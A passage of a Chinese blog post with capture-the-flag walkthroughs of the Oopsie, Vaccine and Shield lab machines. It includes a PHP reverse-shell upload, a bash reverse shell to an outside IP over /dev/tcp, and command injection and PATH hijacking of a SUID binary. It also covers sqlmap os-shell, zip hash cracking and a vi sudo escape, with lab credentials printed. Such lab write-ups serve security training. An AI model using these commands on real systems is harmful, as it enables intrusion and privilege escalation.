+<p>但是这样跑太费时间了，再回头看看其他页面，发现访问<code>Account</code>页面时<code>URL</code>如下：</p>
+<pre tabindex=0><code>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=1
+</code></pre><p><code>id</code>的值应该有一些用处，尝试修改为1、2、3、4，发现到4时回显另一个用户的信息，<code>bp</code>抓包放进<code>Intruder</code>跑一下：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2010.04.51_2021%2009%2014%2010%2005%20.png alt="Screen Shot 2021-09-14 at 10.04.51">
+</p>
+<p>同样获得了超级管理员的<code>Access ID</code>，接下来我们抓取访问文件上传页面的数据包，将<code>user</code>字段的值改为获取到的超级管理员的<code>Access ID</code>，转发后可成功进入文件上传页面，在选中文件后点击上传，再次修改转发包即可成功上传文件。</p>
+<h2 id=2获取用户权限>2、获取用户权限<a hidden class=anchor aria-hidden=true href=#2获取用户权限>#</a></h2>
+<p>上传文件后，下一步肯定需要知道文件的上传路径，使用<code>dirsearch</code>扫一下目录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 dirsearch.py -u http://10.10.10.28/
+
+<span style=color:#75715e># 结果</span>
+<span style=color:#ae81ff>301</span> -  312B  - /uploads  -&gt;  http://10.10.10.28/uploads/
+</code></pre></div><p>尝试上传一句话，蚁剑连接不上，使用<code>Kali</code>自带的<code>PHP</code>反弹<code>Shell</code>试试：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># 将自带Shell复制一份到当前目录</span>
+cp /usr/share/webshells/php/php-reverse-shell.php ./
+
+<span style=color:#75715e># 修改IP和port为本机信息</span>
+$ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;本机IP&gt;&#39;</span>
+$port <span style=color:#f92672>=</span> &lt;监听端口&gt;
+</code></pre></div><p>打开两个命令终端：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># 终端1，监听本机端口</span>
+nc -lvvp &lt;监听端口&gt;
+
+<span style=color:#75715e># 终端2，请求1.php</span>
+curl http://10.10.10.28/uploads/1.php
+</code></pre></div><p>运行完上述两条命令后，可以发现监听窗口反弹了一个<code>Shell</code>，权限为网站权限：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ id
+uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</code></pre></div><p>切换到网站目录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cd /var/www/html
+
+<span style=color:#75715e># 通过ls命令查看当前目录文件，直到最终切换到/var/www/html/cdn-cgi/login目录，发现有如下文件</span>
+$ ls
+admin.php
+db.php
+index.php
+script.js
+
+<span style=color:#75715e># 查看db.php</span>
+$ cat db.php
+&lt;?php
+$conn <span style=color:#f92672>=</span> mysqli_connect<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;localhost&#39;</span>,<span style=color:#e6db74>&#39;robert&#39;</span>,<span style=color:#e6db74>&#39;M3g4C0rpUs3r!&#39;</span>,<span style=color:#e6db74>&#39;garage&#39;</span><span style=color:#f92672>)</span>;
+?&gt;
+</code></pre></div><p>我们得到了一个数据库的账号，接下来看看这个账号的信息：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ id robert             
+uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>bugtracker<span style=color:#f92672>)</span>
+</code></pre></div><p>发现这个用户属于两个组，先查看一下这个用户的家目录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls /home/robert
+user.txt
+</code></pre></div><p><code>user.txt</code>就是用户的<code>flag</code>，接下来获取<code>root</code>的<code>flag</code>。</p>
+<h2 id=3提权>3、提权<a hidden class=anchor aria-hidden=true href=#3提权>#</a></h2>
+<p>从<code>bugtracker</code>用户组入手，查找其是否拥有特殊权限：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ find -type f -group bugtracker 2&gt;/dev/null
+</code></pre></div><p>命令没有回显，执行以下命令升级<code>Shell</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>SHELL<span style=color:#f92672>=</span>/bin/bash script -q /dev/null
+</code></pre></div><p>继续执行之前的命令：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@oopsie:/$ find -type f -group bugtracker 2&gt;/dev/null
+find -type f -group bugtracker 2&gt;/dev/null
+./usr/bin/bugtracker
+</code></pre></div><p>切换到<code>robert</code>用户：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@oopsie:/$ su - robert
+</code></pre></div><p>查看<code>bugtracker</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ ls -la /usr/bin/bugtracker
+ls -la /usr/bin/bugtracker
+-rwsr-xr-- <span style=color:#ae81ff>1</span> root bugtracker <span style=color:#ae81ff>8792</span> Jan <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2020</span> /usr/bin/bugtracker
+</code></pre></div><p>发现其具有<code>s</code>权限，其作用在于用户可使用其所有者权限来运行程序，也就是说，在用户执行<code>bugtracker</code>程序时，将获取文件所有者，即<code>root</code>的权限及<code>UID</code>、<code>GID</code>。</p>
+<p>运行<code>bugtracker</code>看看：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ bugtracker
+bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: <span style=color:#ae81ff>1</span>
+<span style=color:#ae81ff>1</span>
+---------------
+
+Binary package hint: ev-engine-lib
+
+Version: 3.3.3-1
+
+Reproduce:
+When loading library in firmware it seems to be crashed
+
+What you expected to happen:
+Synchronized browsing to be enabled since it is enabled <span style=color:#66d9ef>for</span> that site.
+
+What happened instead:
+Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+</code></pre></div><p>使用<code>strings</code>命令打印出可打印字符：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ strings /usr/bin/bugtracker
+
+<span style=color:#75715e># 发现命令调用</span>
+cat /root/reports/
+</code></pre></div><p><code>bugtracker</code>调用了系统的<code>cat</code>命令输出位于<code>/root/reports</code>目录下的<code>bug</code>报告，且调用<code>cat</code>命令时并未使用绝对路径，即在当前用户的<code>$PATH</code>环境变量中有相应配置。</p>
+<h3 id=方法一>方法一<a hidden class=anchor aria-hidden=true href=#方法一>#</a></h3>
+<p>我们可以创建一个名为<code>cat</code>的恶意命令并修改当前用户<code>$PATH</code>值，让<code>bugtracker</code>调用恶意构造的命令，进一步获取<code>root</code>权限。具体思路为：</p>
+<p>以<code>robert</code>的身份将<code>/tmp</code>目录设置为<code>$PATH</code>环境变量的第一个目录，然后切换到<code>/tmp</code>目录构造恶意<code>cat</code>命令并赋执行权，使<code>bugtracker</code>实际上调用了恶意构造的<code>cat</code>命令。</p>
+<p>命令如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+robert@oopsie:~$ export PATH<span style=color:#f92672>=</span>/tmp:$PATH
+export PATH<span style=color:#f92672>=</span>/tmp:$PATH
+robert@oopsie:~$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+robert@oopsie:~$ cd /tmp
+cd /tmp
+robert@oopsie:/tmp$ echo <span style=color:#e6db74>&#39;/bin/bash&#39;</span> &gt; cat
+echo <span style=color:#e6db74>&#39;/bin/bash&#39;</span> &gt; cat
+robert@oopsie:/tmp$ chmod +x cat
+</code></pre></div><p>再次运行<code>bugtracker</code>就会以<code>root</code>身份执行一个<code>shell</code>了。</p>
+<h3 id=方法二推荐>方法二（推荐）<a hidden class=anchor aria-hidden=true href=#方法二推荐>#</a></h3>
+<p>只需在运行<code>bugtracker</code>时输入如下命令：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:/tmp$ bugtracker
+bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 111;<span style=color:#e6db74>&#39;/bin/bash&#39;</span>
+111;<span style=color:#e6db74>&#39;/bin/bash&#39;</span>
+---------------
+
+cat: /root/reports/111: No such file or directory
+</code></pre></div><p>此时便会以<code>root</code>身份执行一个<code>shell</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@oopsie:/tmp# id
+id
+uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>bugtracker<span style=color:#f92672>)</span>
+</code></pre></div><p>查看<code>/root</code>目录下所有文件：</p>
+<pre tabindex=0><code>root@oopsie:/tmp# ls -a /root
+ls -a /root
+.   .bash_history  .cache   .gnupg  .profile  root.txt  .viminfo
+..  .bashrc        .config  .local  reports   .ssh
+</code></pre><p>下一关信息：</p>
+<p>切换到<code>/root/.config/filezilla</code>，查看<code>filezilla.xml</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@oopsie:/root/.config/filezilla# cat filezilla.xml
+</code></pre></div><p>内容：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34; ?&gt;</span>
+<span style=color:#f92672>&lt;FileZilla3&gt;</span>
+    <span style=color:#f92672>&lt;RecentServers&gt;</span>
+        <span style=color:#f92672>&lt;Server&gt;</span>
+            <span style=color:#f92672>&lt;Host&gt;</span>10.10.10.46<span style=color:#f92672>&lt;/Host&gt;</span>
+            <span style=color:#f92672>&lt;Port&gt;</span>21<span style=color:#f92672>&lt;/Port&gt;</span>
+            <span style=color:#f92672>&lt;Protocol&gt;</span>0<span style=color:#f92672>&lt;/Protocol&gt;</span>
+            <span style=color:#f92672>&lt;Type&gt;</span>0<span style=color:#f92672>&lt;/Type&gt;</span>
+            <span style=color:#f92672>&lt;User&gt;</span>ftpuser<span style=color:#f92672>&lt;/User&gt;</span>
+            <span style=color:#f92672>&lt;Pass&gt;</span>mc@F1l3ZilL4<span style=color:#f92672>&lt;/Pass&gt;</span>
+            <span style=color:#f92672>&lt;Logontype&gt;</span>1<span style=color:#f92672>&lt;/Logontype&gt;</span>
+            <span style=color:#f92672>&lt;TimezoneOffset&gt;</span>0<span style=color:#f92672>&lt;/TimezoneOffset&gt;</span>
+            <span style=color:#f92672>&lt;PasvMode&gt;</span>MODE_DEFAULT<span style=color:#f92672>&lt;/PasvMode&gt;</span>
+            <span style=color:#f92672>&lt;MaximumMultipleConnections&gt;</span>0<span style=color:#f92672>&lt;/MaximumMultipleConnections&gt;</span>
+            <span style=color:#f92672>&lt;EncodingType&gt;</span>Auto<span style=color:#f92672>&lt;/EncodingType&gt;</span>
+            <span style=color:#f92672>&lt;BypassProxy&gt;</span>0<span style=color:#f92672>&lt;/BypassProxy&gt;</span>
+        <span style=color:#f92672>&lt;/Server&gt;</span>
+    <span style=color:#f92672>&lt;/RecentServers&gt;</span>
+<span style=color:#f92672>&lt;/FileZilla3&gt;</span>
+</code></pre></div><h1 id=accine>Accine<a hidden class=anchor aria-hidden=true href=#accine>#</a></h1>
+<blockquote>
+<p>目标：拿下系统权限。</p>
+<p>靶机IP：10.10.10.46。</p>
+</blockquote>
+<h2 id=1信息收集-2>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集-2>#</a></h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sS -sV 10.10.10.46
+
+<span style=color:#75715e># 结果</span>
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.46 <span style=color:#f92672>(</span>10.10.10.46<span style=color:#f92672>)</span>
+Host is up <span style=color:#f92672>(</span>0.30s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>997</span> closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>直接访问<code>HTTP</code>服务，需要帐密，上一关我们只获得了一个<code>ftp</code>用户，尝试登录<code>ftp</code>服务器：</p>
+<pre tabindex=0><code>ftp://ftpuser:mc@F1l3ZilL4@10.10.10.46/
+</code></pre><p>下载得到<code>backup.zip</code>文件，解压的时候发现有密码，尝试使用常规暴力破解，时间太长顶不住。。。考虑先获取<code>backup.zip</code>的<code>hash</code>值，再使用<code>john</code>进行破解。</p>
+<p>获取<code>hash</code>（在<code>root</code>下运行）：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>zip2john /home/oopsdc/Downloads/backup.zip &gt; hash
+</code></pre></div><p>使用<code>john</code>对哈希文件进行破解：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john hash
+
+<span style=color:#75715e># 结果</span>
+Using default input encoding: UTF-8
+Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>PKZIP <span style=color:#f92672>[</span>32/64<span style=color:#f92672>])</span>
+Will run <span style=color:#ae81ff>2</span> OpenMP threads
+Proceeding with single, rules:Single
+Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+Warning: Only <span style=color:#ae81ff>5</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+Warning: Only <span style=color:#ae81ff>4</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+Almost <span style=color:#66d9ef>done</span>: Processing the remaining buffered candidate passwords, <span style=color:#66d9ef>if</span> any.
+Warning: Only <span style=color:#ae81ff>6</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+<span style=color:#ae81ff>741852963</span>        <span style=color:#f92672>(</span>backup.zip<span style=color:#f92672>)</span>
+1g 0:00:00:00 DONE 2/3 <span style=color:#f92672>(</span>2021-09-16 10:00<span style=color:#f92672>)</span> 25.00g/s 1798Kp/s 1798Kc/s 1798KC/s 123456..Peter
+Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div><p>解压后得到<code>index.php</code>和<code>style.css</code>两个文件，在<code>index.php</code>中发现了用户帐密：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#a6e22e>session_start</span>();
+  <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>])) {
+    <span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;admin&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span>) {
+      $_SESSION[<span style=color:#e6db74>&#39;login&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;true&#34;</span>;
+      <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: dashboard.php&#34;</span>);
+    }
+  }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>对密码进行<code>md5</code>解密，得到最终帐密<code>admin/qwerty789</code>。</p>
+<h2 id=2获取用户权限-1>2、获取用户权限<a hidden class=anchor aria-hidden=true href=#2获取用户权限-1>#</a></h2>
+<p>登录后是一个目录页面，尝试搜索：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%2520Shot%25202021-09-16%2520at%252010.27.42_2021%252009%252016%252010%252029%2520_2021%252009%252016%252011%252049%2520.png alt="Screen Shot 2021-09-16 at 10.27.42_2021 09 16 10 29 ">
+</p>
+<p>页面回显不对，再次尝试<code>1'</code>发现有报错语句，<code>F12</code>拿一下当前的<code>PHPSESSION</code>，使用<code>sqlmap</code>查看当前数据库信息：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -u <span style=color:#e6db74>&#34;http://10.10.10.46/dashboard.php?search=1&#34;</span> -dbs --cookie <span style=color:#e6db74>&#34;PHPSESSID=dudnfpur8hjgfam3gb22nna4sf&#34;</span>
+
+<span style=color:#75715e># 结果</span>
+<span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 19.10 or 20.04 <span style=color:#f92672>(</span>focal or eoan<span style=color:#f92672>)</span>
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+<span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> schema names are going to be used on PostgreSQL <span style=color:#66d9ef>for</span> enumeration as the counterpart to database names on other DBMSes
+<span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching database <span style=color:#f92672>(</span>schema<span style=color:#f92672>)</span> names
+<span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;public&#39;</span>
+<span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;pg_catalog&#39;</span>
+<span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;information_schema&#39;</span>
+available databases <span style=color:#f92672>[</span>3<span style=color:#f92672>]</span>:
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> information_schema
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> pg_catalog
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> public
+</code></pre></div><p>可以发现当前是<code>Posgtre</code>数据库，尝试能否执行<code>os-shell</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -u http://10.10.10.46/dashboard.php?search<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> --cookie <span style=color:#e6db74>&#34;PHPSESSID=dudnfpur8hjgfam3gb22nna4sf&#34;</span> --os-shell
+
+<span style=color:#75715e># 结果</span>
+os-shell&gt; whoami
+<span style=color:#66d9ef>do</span> you want to retrieve the command standard output? <span style=color:#f92672>[</span>Y/n/a<span style=color:#f92672>]</span> n 
+<span style=color:#f92672>[</span>10:43:23<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;postgres&#39;</span>
+</code></pre></div><p>这里简要介绍一下<code>os-shell</code>的原理及使用条件：</p>
+<p>原理：使用<code>into outfile</code>函数将可用来上传文件的<code>a.php</code>上传至网站根目录，然后再利用<code>a.php</code>上传一个用于执行并回显系统命令的<code>b.php</code>。</p>
+<p>使用条件：1、网站必须为<code>root</code>权限；2、需要知道网站绝对路径；3、<code>CGP</code>为<code>off</code>，<code>PHP</code>主动转义功能关闭。</p>
+<p>接下来我们简单反弹一个<code>shell</code>，在<code>os-shell</code>中执行如下命令：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash -c <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.188/1234 0&gt;&amp;1&#39;</span>
+</code></pre></div><p>切换到网站根目录并列出文件：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ostgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
+cd /var/www/html
+postgres@vaccine:/var/www/html$ ls
+ls
+
+<span style=color:#75715e># 结果</span>
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+</code></pre></div><p>查看<code>dashboard.php</code>内容：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>postgres@vaccine:/var/www/html$ cat dashboard.php
+cat dashboard.php
+
+<span style=color:#75715e># 得到一个用户账号</span>
+	try <span style=color:#f92672>{</span>
+	  $conn <span style=color:#f92672>=</span> pg_connect<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&#34;</span><span style=color:#f92672>)</span>;
+	<span style=color:#f92672>}</span>
+</code></pre></div><p>尝试直接<code>ssh</code>到主机：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>postgres@vaccine:~$ id
+uid<span style=color:#f92672>=</span>111<span style=color:#f92672>(</span>postgres<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>117<span style=color:#f92672>(</span>postgres<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>117<span style=color:#f92672>(</span>postgres<span style=color:#f92672>)</span>,116<span style=color:#f92672>(</span>ssl-cert<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=3提权-1>3、提权<a hidden class=anchor aria-hidden=true href=#3提权-1>#</a></h2>
+<p>查看当前用户的<code>sudo</code>权限：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>postgres@vaccine:~$ sudo -l
+<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> postgres: 
+Matching Defaults entries <span style=color:#66d9ef>for</span> postgres on vaccine:
+    env_reset, mail_badpass,
+    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+
+User postgres may run the following commands on vaccine:
+    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</code></pre></div><p><code>pg_hba.conf</code>为<code>PostgreSQL</code>的访问策略配置文件，默认位于<code>/var/lib/pgsql/&lt;version>/data/</code>目录。</p>
+<p>运行提示的命令：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</code></pre></div><p>进入文件后默认为命令模式，按下<code>Shift</code>+<code>:</code>进入末行模式，运行<code>!/bin/bash</code>命令，注：需要在前面加一个空格：</p>
+<pre tabindex=0><code>: !/bin/bash
+</code></pre><p>此时会退出<code>vi</code>编辑器，且用户变为<code>root</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@vaccine:/var/lib/postgresql# id
+uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
+</code></pre></div><p>提权成功。</p>
+<h1 id=shield>Shield<a hidden class=anchor aria-hidden=true href=#shield>#</a></h1>
+<blockquote>
+<p>目标：拿到系统权限。</p>
+<p>靶机IP：10.10.10.29。</p>
+<p>吐槽：这真是一个卡到爆的靶场。</p>
+</blockquote>
+<h2 id=1信息收集-3>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集-3>#</a></h2>
+<p>上<code>nmap</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sS -sV 10.10.10.29
+
+<span style=color:#75715e># 结果</span>
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.29 <span style=color:#f92672>(</span>10.10.10.29<span style=color:#f92672>)</span>
+Host is up <span style=color:#f92672>(</span>0.48s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>998</span> filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+3306/tcp open  mysql   MySQL <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div><p>靶机开了80端口，用<code>dirsearch</code>扫一下目录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo python3 dirsearch.py -u http://10.10.10.29/
+
+<span style=color:#75715e># 结果</span>
+<span style=color:#ae81ff>301</span> -    0B  - /Wordpress/  -&gt;  http://10.10.10.29/wordpress/
+</code></pre></div><p>使用<code>Wappalyzer</code>查看当前WP版本为5.2.1，IIS版本为10，尝试利用WP版本未授权访问漏洞查看敏感页面，无果。资料：</p>
+<p><a href=https://www.freebuf.com/articles/web/244969.html>Wordpress(CVE-2019-17671)未授权访问漏洞复现 - FreeBuf网络安全行业门户</a></p>
